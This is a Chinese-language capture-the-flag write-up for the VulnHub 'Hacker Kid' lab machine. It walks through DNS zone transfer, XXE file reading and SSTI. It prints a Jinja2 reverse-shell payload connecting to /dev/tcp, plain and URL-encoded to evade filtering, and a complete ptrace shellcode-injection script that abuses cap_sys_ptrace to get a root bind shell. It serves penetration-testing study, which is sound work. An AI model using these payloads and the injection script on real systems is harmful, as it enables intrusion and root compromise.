# 相关信息

kali：192.168.195.170

靶机：192.168.195.30

相关的靶机介绍：[Hacker kid: 1.0.1 ~ VulnHub](https://www.vulnhub.com/entry/hacker-kid-101,719/)

下载地址：https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova

难度：OSCP风格的中级难度靶机

目标：获取root权限（关注信息收集，不需要暴力破解，每一步都有适当的提示）

# 文字思路

## 全流程思路：

主机发现	端口发现	web信息收集	dns区域传输的漏洞	xxe注入攻击	ssti模板注入	Capabilitie提权

## 局部思路

### 下意识的操作

1. 更改页面的index.html的后缀再度访问，通过是否能够正常访问来判断web环境。
2. 发现53端口（dns）记得进行udp扫描。
3. web渗透的时候查看网页的源码是非常重要的。
    1. 查看网页的注释
    2. 查看资源的引用
4. 当注入没有达到我们预期的时候，应该考虑是否需要进行相关的编码/混淆

### 数据外带

1. php封装器
2. sql注入
3. xml读取
4. dns外带


# 具体流程

### 信息收集/分析：

1. 发现主机。百度我们发现9999端口的`Tornado`是一个python开发web的服务。同时我们发现了dns开放的端口（dns为udp,但是nmap默认是只进行tcp扫描的），所以我们需要进一步的扫描，带上-sU参数进`udp`的扫描（这应该形成一个下意识的反应）。

    <img src="http://image.cchl.fun/kali_image/image-20230520185707716.png" alt="image-20230520185707716" style="zoom:50%;" />

    <img src="http://image.cchl.fun/kali_image/2.png" style="zoom: 67%;" />

    

2. 和以往的靶机不同，这里是没有开放ssh（22）端口的。我们这次主要注重53端口。它的端口服务版本为（BIND 9.16.1），通过检索我们可以发现这个版本（`BIND 9.16.1`）是有两个远程执行的漏洞,能直接拿下权限(`CVE-2020-8625`,`CVE-2021-25216`）,但是我们发现靶机是无法（视频这样讲的，==等打靶完成记得自己检索==）。

3. 哪我们就直接访问相关的80网页。同时围绕网页进行

    <img src="http://image.cchl.fun/kali_image/image-20230520190534974.png" alt="image-20230520190534974" style="zoom: 50%;" />

    翻译：一个黑客小孩；

    仅仅因为我拿下了你的整个服务器，你就将我叫做混蛋的黑客对不对？；

    现在我已近获得了进入你服务的权限，如果你足够的聪明，就向我展示一下把权限拿回去吧；

    你挖的越深，你再你的服务上发现我的可能就越大。发现我吧，发现我吧。

    之所以翻译这段话是因为一个单词（==dig==）。这就是作者给我的提示让我们用dig命令。

    然后我们访问他的三个标签乍一看貌似也没有什么用。==但是老师用了非常细的几个个技巧==。

    1. `start：`访问这个标签的时候，我们可以观察`url`变为`index.html`。（==在以后的渗透操作中我们应该形成默认的操作==）当我们更后缀为`PHP`的时候发现正常访问，表明开发环境为==php==

    <img src="http://image.cchl.fun/kali_image/image-20230520191855322.png" alt="image-20230520191855322" style="zoom: 80%;" />

    <img src="http://image.cchl.fun/kali_image/image-20230520191914928.png" alt="image-20230520191914928" style="zoom: 50%;" />

    2. `app：`访问这个标签的时候界面是没有任何的变化，但是url发生了一系列的变化。

        ![image-20230520193511960](http://image.cchl.fun/kali_image/image-20230520193511960.png)

        `index.php#app.html`这个url中我们发现了`app.html`这个标识符，我们可以直接访问看看。结果让人欢喜，可是我们无法操作页面的任何东西，点击没有任何作用   				  						[==什么是#标识符==](#tag1)<a id='back1'></a>

        <img src="http://image.cchl.fun/kali_image/image-20230520195355392.png" alt="image-20230520195355392" style="zoom:50%;" />

    3. `form：`浏览后没有什么具体的发现，没有什么漏洞

        <img src="http://image.cchl.fun/kali_image/image-20230520195720202.png" alt="image-20230520195720202" style="zoom: 50%;" />

        这是我们通过gobuster进行的目录发现，和我们的手工发现也是没有什么不同的（目录进行迭代发现也是没有任何结果的）

        <img src="http://image.cchl.fun/kali_image/image-20230520200035507.png" alt="image-20230520200035507" style="zoom:67%;" />

    4. 进行对网页源码的分别查看：1，找注释。2，找引用。3，找接口。

        通过我们审查 `index.php#form.html`这个网页我们发现有个注释提示我们这个网页是有个 `GET` 变量为 `page_no` 。(==注意== `index.php#form.html` 和 `form.html` 是两个不同的网页源码，虽然他们渲染出来的网页是一样的。具体去看装饰器的知识点。)

        <img src="http://image.cchl.fun/kali_image/image-20230521083714747.png" alt="image-20230521083714747" style="zoom: 67%;" />

        然后通过burpsuite对这个参数进行 `Sniper`攻击，通过注释的上下文翻译易知是个该参数是个整形。通过字典的设置和结果的查看我们明显的发现了当 `page_no = 21`的时候触发了服务的变化（通过返回包的大小）。<img src="http://image.cchl.fun/kali_image/image-20230521084958908.png" alt="image-20230521084958908" style="zoom: 67%;" />

    5. 我们进而访问这个网页我们发现页面下面多了一段文字。大致意思是 黑客留下了一个后门网站来让它可以随时的进行对服务器的控制。他的域名为 `hacker.blackhat.loacl 截图有问题请注意`（==一个ip发布多个网页的方法：1，不同端口   2，相同端口，不同域名或主机名==）很明显黑客是采用的第二种方法。为了我们能够正常的利用这个域名访问到靶机上去我们是需要修个hosts文件的 `/etc/hosts`，只有这样我们才能通过不同的域名访问同一个ip。一般发布的网页很有可能加上主机名，不加上主机名都是指向同一个地址的（这也是我们写两个解析的原因）

        ![image-20230521090508823](http://image.cchl.fun/kali_image/image-20230521090508823.png)

        ​															==**下面这个截图有点小问题，域名写错位了**==

        <img src="http://image.cchl.fun/kali_image/image-20230521090843513.png" alt="image-20230521090843513" style="zoom: 67%;" />

    6. 我们访问了这两个域名一个禁止访问，另一个和原来界面没有任何变化。这就让我们感到奇怪，同时也让我们猜测是否这个域名是否有其他的主机名？再结合我们开头的 `dig`提示。我们就使用dig命令来进行探测。然后将我们探测到的域写入到hosts文件中依次的访问。                                         [==什么是dns的axfr==](#tag2)<a id='back2'></a>

        <img src="http://image.cchl.fun/kali_image/image-20230521094312205.png" alt="image-20230521094312205" style="zoom: 67%;" />

        cname的记录如果重复是可以不用写入的。我们依次的访问直到 `hackerkid.blackhat.local`这个记录为止。我们才发现了不一样的界面，用于创建账户的页面。

        <img src="http://image.cchl.fun/kali_image/image-20230521100616477.png" alt="image-20230521100616477" style="zoom:67%;" />

        <img src="http://image.cchl.fun/kali_image/image-20230521100753697.png" alt="image-20230521100753697" style="zoom:67%;" />

4. 对80端口的http服务发现完毕我们在来访问一下9999端口的http服务，可以发现为可能为一个后台的管理界面。==然后我们在通过对80端口扫描发现的域名来依次访问9999端口==来访问依然是没有什么收获的，还是这个界面。

    ![image-20230521100920839](http://image.cchl.fun/kali_image/image-20230521100920839.png)

5. 那我们再回到80端口的发现的http服务：用来创建账号的，但是我们发现无论我们使用什么邮箱域名注册，都会返回我们邮箱错误的提示（ ==包含了我们输入的邮箱具体值== ，结合作者提示我们不需要进行暴力破解，我们可以考虑`ssti`的哇）。查看相关的代码和用burpsuite抓包，就可以发现一个常用但不知名的语言 ==xml==。就启示我们进行==xml注入==。				

    `<!DOCTYPE foo[<!ENTITY xxs SYSTEM 'file:///etc/passwd'>]>` 

    注入这行代码，同时修改  `<email>`标签里的内容改为变量&xxs;。记得加上 `；`号                             	                  

    大致意思是读取文件 `/etc/passwd`文件 ，将其赋给 xxs变量。然后将这个值放人 `<email>`标签中从而让服务器误认为这个文件是我们上传的邮箱。从而在回显我们错误邮箱的时候外带出我们窃取的文件。

    ​	                                                            		 [==什么是xml语言和相关语言的解释==](#tag3)			          	<a id='back3'></a>

    <img src="http://image.cchl.fun/kali_image/Snipaste_2023-05-21_20-43-06.png" style="zoom:67%;" />

6. 通过上面的信息外带，我们进行用户的权限判断 `saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash`是我们的最好的目标(不是root用户，但是能执行 `shell`)。然后通过 `xml` 对这个用户进行信息的外带。

    我们是可以依次的访问 `linux`系统一些默认的文件，隐藏文件等等。直到到我们访问 `/home/saket/.bashrc`   (`.bashrc` 是用户级别的 Bash Shell 配置文件，用于自定义用户的 Shell 环境和行为)

    <img src="http://image.cchl.fun/kali_image/image-20230522221128432.png" alt="image-20230522221128432" style="zoom:50%;" />

    但是我们发现一个比较恶性的事就是没有数据回显，表明我们没有权限或者说不能直接读取他。但是我们可以通过那个上个靶机渗透的技巧 ==PHP的封装器==来尝试一把。在前期的信息搜集我们发现环境为php环境所以可以使用这个渗透技巧。（不同的渗透技巧是可以相互融合的非常重要）。

<img src="http://image.cchl.fun/kali_image/image-20230522221358620.png" alt="image-20230522221358620" style="zoom: 50%;" />

​		然后我们进行解码读取，浏览到最下面我们可以发现一个非常敏感的东西。这个是所这个用户是可以跑 `python`语言的。那么我们		回想我们可以使用登陆的地方。ssh没开，唯一能够使用到登陆的就是我们发现的 ==9999==端口的登陆网页。但是我们尝试登陆的时候		却发现是无法登陆进去的。但是这个又不像假的信息，所以我们尝试 `saket`作为用户名进行登陆的时候发现成功进入 （没有为什        		么，就是尝试，但是这种尝试是需要经验的）

![image-20230522223412654](http://image.cchl.fun/kali_image/image-20230522223412654.png)

7. 如图当我们以 `saket`进入后我们发现又有提示，不断地暗示我们进行参数传递操作提示我们有传递参数 `name`，（当然如果没有看懂提示，进行参数的爆破也是必须要进行的步骤）。我们发现当我们对name变量赋值后，页面会原封不动的给我们展示出来------->这不就符和 `ssti`==漏洞==的条件吗？

    <img src="http://image.cchl.fun/kali_image/image-20230522225916047.png" alt="image-20230522225916047" style="zoom: 67%;" />

    <img src="http://image.cchl.fun/kali_image/image-20230522230029741.png" alt="image-20230522230029741" style="zoom: 50%;" />

8. 进行 `ssti`漏洞的确认，在name后面注入paylaod：`{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz]`   或者 `${7*7},{{7*7}}`。我们几乎可以确认这就是个 `ssti`漏洞。

<img src="http://image.cchl.fun/kali_image/Snipaste_2023-05-22_23-12-13.png" style="zoom: 67%;" />

<img src="http://image.cchl.fun/kali_image/image-20230523181617216.png" alt="image-20230523181617216" style="zoom:67%;" />

9. 然后我们上载反弹shell的payload,但是我们注入反弹后我们监听的端口是没有响应的，于是我们就应该下意识的想到需要进行==相关命令的编码或者混淆==。我们对命令进行url编码再次上传成功的连接成功，成功的反弹了shell.

    ```jinja2
    {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.195.170/4444 0>&1"')}}
    ```

    ```
    %7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%6f%73%2e%73%79%73%74%65%6d%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%39%35%2e%31%37%30%2f%34%34%34%34%20%30%3e%26%31%22%27%29%7d%7d%61
    ```

    ![image-20230523191607317](http://image.cchl.fun/kali_image/image-20230523191607317.png)

    

10. 然后就是日常的信息搜集，然后利用各种提权的思路。但是我们都一一的行不通。视频介绍我们从 `Capabilities`这个权限管理系统设置不当来入手才有所进展。              <a id='back5'></a>                      [==什么是Capabilities？==](#tag5)
    首先使用 `/sbin/getcap -r / 2>/dev/null`来递归的查询系统中所有配置了 `capabilities`权限的文件。（由于靶机没有指定 `getcap`的系统路径，所有通过文件的形式来进行执行命令）

    <img src="http://image.cchl.fun/kali_image/image-20230523194731730.png" alt="image-20230523194731730" style="zoom:50%;" />

11. 我们发现 `python2.7`是有个 `cap_sys_ptrace`这个权限（可以调试程序权限），==而这个权限是有可以提权的漏洞的==。

     所以我们就直接来看系统已经运行的有 `root`权限的程序有哪些，通过调试这些程序来获取root权限。然后通过python2.7来进行利用漏洞来提取

     <img src="http://image.cchl.fun/kali_image/image-20230523200345670.png" alt="image-20230523200345670" style="zoom: 67%;" />

12. 同时我们利用`python`开启`44`来上传一个 脚本。然后随意选择一个root的程序pid就可以执行代码了。这个脚本会默认的开启本地的5600端口。可以在kali上直接nc连接。采用 `id`命令就可以直接发现为root用户了。

     [==脚本代码==](#tag4)<a id='back4'></a>![image-20230523202117759](http://image.cchl.fun/kali_image/image-20230523202117759.png)

    ![image-20230523205121149](http://image.cchl.fun/kali_image/image-20230523205121149.png)

     <img src="http://image.cchl.fun/kali_image/image-20230523205037421.png" alt="image-20230523205037421" style="zoom:67%;" />

# Payload

## xml

```xml-dtd
<!DOCTYPE foo[<!ENTITY xxs SYSTEM 'file:///etc/passwd'>]>
```

1. what is xml?								[==返回==](#back3)<a id='tag3'></a>

    ​	简单理解就是和html一样是标记性语言，但是他有不同之处。大致的语法和html语言相同，但是比html更加的灵活。XML 的设计宗旨是传输数据，而不是显示数据。XML 标签没有被预定义。您需要自行定义标签。（这也是可以参数漏洞的主要原因）

    更多的详细详细特点和解释请访问网站：		[==XML 教程 | 菜鸟教程 (runoob.com)==](https://www.runoob.com/xml/xml-tutorial.html)

2. 具体漏洞：

    1.  `<!DOCTYPE foo[<!ENTITY xxs SYSTEM 'file:///etc/passwd'>]>`:

        这段XML代码是一个实体注入（Entity Injection）的示例。它包含了一个外部实体引用，其中的实体 `xxs` 被定义为引用了文件路径 `/etc/passwd`。

        1. `<!DOCTYPE foo [...]>`：这是DTD（文档类型定义）的声明，指定文档类型为 `foo`。在这个示例中，DTD定义被省略，我们只关注实体引用。

            DOCTYPE后面跟的是文件类型 ，`foo` 是表示不指定文件类型。`[]`表示可以选择的内容。

        2. `<!ENTITY xxs SYSTEM 'file:///etc/passwd'>`：这是一个实体定义，其中 `xxs` 是实体的名称，`SYSTEM` 关键字指示它是一个外部实体引用，`file:///etc/passwd` 是实体的值，指定了一个文件路径。在这个例子中，实体 `xxs` 被定义为引用 `/etc/passwd` 文件。这就是固定的格式。

        3. `file:///etc/passwd` 是一个文件路径的 URL。在这个 URL 中，`file://` 是指示协议为文件协议的前缀，表示后面的路径是一个本地文件路径

## ssti漏洞

### 检测payload

1. url传入参数的检测payload，同传入该参数查看是否爆出错误。几乎是所有的模板开发语言可以用这个payload

```多种模板语言的标识组合
{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz]
```

2. 同样，我们来查看运算是否被执行来确定是否有ssti漏洞

```jinja2
${7*7},{{7*7}}
```

### 反弹shellpayload

```jinja2
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.195.170/4444 0>&1"')}}
```





# 相关工具

### ps

1. what？

    用于查看当前运行进程信息的命令

2. 具体实例：

    1. ps -asf | grep root

        -a:显示所有进程包括其他用户。-s表示显示进程的状态（亦可以追加状态来筛选相关的进程）。-f

    2. ps:查看当前用户所有进程

    3. -f：显示完整的进程信息

    4. -p \<PID>:指定查看进程的详细信息

    5. -U：用于指定显示该用户下面的进程

### getcap

1. what?

    用于查看文件或可执行程序的能力（capabilities）设置。通常和 `setcap`结合使用

2. 具体实例

    1. getcap -r /：表示通过递归的方式查看 `/`目录下面所有设置 `capabilities`权限的命令

### setcap

1. what?

    用于为文件或可执行程序设置能力（capabilities）

2. 具体实例

    1. `setcap <capability>[-<flag>] <file_path>`

        setcap cap_sys_admin=eip /



### ascii工具

​		下载后，直接键入ascii就可以查看每个字母对于的ascii值了

### dig

1. what?

    进行 DNS（Domain Name System）查询。获取与域名相关的信息，如域名的 IP 地址、域名服务器的信息、DNS 记录等。

2. 具体实例

    1. dig axfr @2.3.4.5 cchl.fun
    
        通过axfr试着向dns服务器2.3.4.5来请求cchl.fun的完整dns记录。

### file

1. what

    用于确定文件的类型。它可以根据文件的内容和特征对文件进行分类，并返回相应的描述信息。==同时它是可以读取文件的具体内容的==

2. 具体描述

    1. `-b`：仅显示文件类型，不显示文件名。
    2. `-i`：显示 MIME 类型。MIME类型由两个部分组成：媒体类型（Media Type）和子类型（Subtype）PDF文件的MIME类型为          application/pdf
    3. `-m`：指定魔术文件（Magic File）的路径，用于识别文件类型。
    4. `-z`：对压缩文件进行分析。

    



# 复盘/相关知识点

## 重要

### Capabilitises

1. what?                                                       [==返回==](#back5)<a id='tag5'></a>   

    是一种安全机制，用于在进程级别上控制对特定系统操作的访问权限。它们提供了一种细粒度的权限控制，使得进程可以具有特定的权限而不必以完全特权运行

    具体的各个权限参考：http://man7.org/linux/man-pages/man7/capabilities.7.html

2. 相关漏洞与使用

    1. setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap

        设置当前用户对 `/usr/bin/dumpcap`的程序拥有 `cap_net_raw,cap_net_admin`的权限，`dumpcap`是 `wireshark`进行抓包的底层命令。通过这个设置可以让linux上普通用户按照的 `wireshark`能够正常的抓包。
    
    2. 相关权限
    
        1.    CAP_SYS_PTRACE
    
            这个权限就是可以调试其他系统权限的权限，他是有一定提权的可能的。



### ./bashrc 文件

​	 	是用户级别的 Bash Shell 配置文件，用于自定义用户的 Shell 环境和行为



### dns相关知识点

#### 区域传输（axfr）

1. what?                                            [==返回==](#back2)<a id='tag2'></a>

    是DNS系统中用于在主DNS服务器和辅助DNS服务器之间传输完整区域数据的机制。它通过主服务器响应辅助服务器的AXFR请求，使辅助服务器能够更新自己的区域副本，以提供可靠的域名解析服务。

2. Notice

    axfr是在安全实践中是不应该对所有的用户开发的，一般应该只允许同一个域下面的不同概念的dns服务器能够相互的axfr通过53/tcp进行dns的同步（这是需要手工配置的）.当主DNS服务器上的区域数据发生变化时（例如添加、删除或修改记录），辅助DNS服务器需要更新自己的数据，以保持与主服务器的一致性。这时就需要进行区域传输。

#### 各种解析

1. NS (Name Server) 记录： NS 记录用于指定该域名的权威域名服务器（Name Server）。它指定负责管理该域名的 DNS 服务器，提供与该域名相关的 DNS 信息。
2. MX (Mail Exchanger) 记录： MX 记录用于指定接收域名的电子邮件的邮件服务器。它将域名映射到一个或多个邮件服务器，以指定邮件交换的目标。



### 53端口

53端口是dns服务器占用，其中53/udp是用来进行dns功能。==53/tcp==是在同一个域下的不同dns主机进行相互通讯的端口（一般来讲）。

### url中的#号

#为片段标识符，是用于标识网页中特定部分或锚点的标记。当浏览器加载包含片段标识符的 URL 时，它会滚动到相应的片段或特定位置，使用户可以直接导航到该位置。

以下是一些常见的用法和作用：					[==返回==](#back1)<a id='tag1'></a>

1. 页面内部导航：在单个网页中，可以使用片段标识符来标识不同的部分，用户可以直接跳转到页面中的特定部分，无需手动滚动。

    例如：`https://www.example.com/page.html#section2`

2. 锚点链接：在一个网页中，可以使用片段标识符来创建内部链接，使用户从一个页面跳转到同一页面的不同部分。

    例如：`<a href="#section2">跳转到第二部分</a>`

3. 页面共享和书签：通过包含片段标识符的 URL，可以在网页间共享特定位置的链接。这对于在社交媒体上分享感兴趣的内容或创建书签非常有用。

    例如：`https://www.example.com/article.html#summary`

需要注意的是，片段标识符只在客户端（浏览器）中起作用，不会发送给服务器。因此，服务器不会根据片段标识符来提供不同的内容。片段标识符仅用于客户端的导航和定位。

## 了解即可

### what is Tornado?

Tornado 是一个基于 Python 的开源 Web 应用程序框架和异步网络库。它由 FriendFeed（现在属于 Facebook）开发并开源，旨在提供高性能和可伸缩性的 Web 应用程序开发解决方案。

Tornado 的主要特点包括：

1. 异步和非阻塞：Tornado 使用基于事件循环的异步 I/O 模型，使得它能够处理大量并发连接而不会阻塞或消耗太多系统资源。这使得它非常适合构建高性能的网络应用程序，特别是在需要处理大量并发请求的场景下。
2. 轻量级：Tornado 的核心代码库相对较小，依赖较少，因此可以轻松集成到现有的应用程序中，或作为一个独立的服务来构建 Web 服务。
3. 支持异步请求处理：Tornado 提供了异步的请求处理机制，可以轻松处理长轮询（long polling）、WebSockets 和其他实时通信协议。
4. 内置的 Web 服务器：Tornado 包含一个内置的非常快速的 HTTP 服务器，因此可以直接部署和运行 Tornado 应用程序，而无需额外的 Web 服务器软件。
5. 支持模板引擎：Tornado 提供了内置的模板引擎，使得开发人员可以方便地构建动态的、可定制的 Web 页面。

Tornado 可以用于构建各种类型的 Web 应用程序，包括实时聊天应用、实时博客平台、Web API 服务等。它在性能和可伸缩性方面的优势使其成为处理大量并发请求的理想选择



# 脚本

### python

1. 用途

    用于capabilities的cap_sys_prace配置不当来进行提取

2. 使用条件

    1. python的解释权有 cap_sys_prace权限
    2. 找到一个有root权限的进程

3. 如何是使用

    1. python2.7 script.py id

        id为一个root用户的程序

    2. 使用完脚本后会自动打开靶机的 `5600`端口

[==返回==](#back4)<a id='tag4'></a>

```python
# inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
# GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT   = 4
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),]
libc = ctypes.CDLL("libc.so.6")
pid=int(sys.argv[1])
# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64
# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()
# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))
# Shell code copied from exploit db.
shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
  # Convert the byte to little endian.
  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
  shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
  shellcode_byte=int(shellcode_byte_little_endian,16)
  # Inject the byte.
  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
print("Shellcode Injected!!")
# Modify the instuction pointer
registers.rip=registers.rip+2
# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))
# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

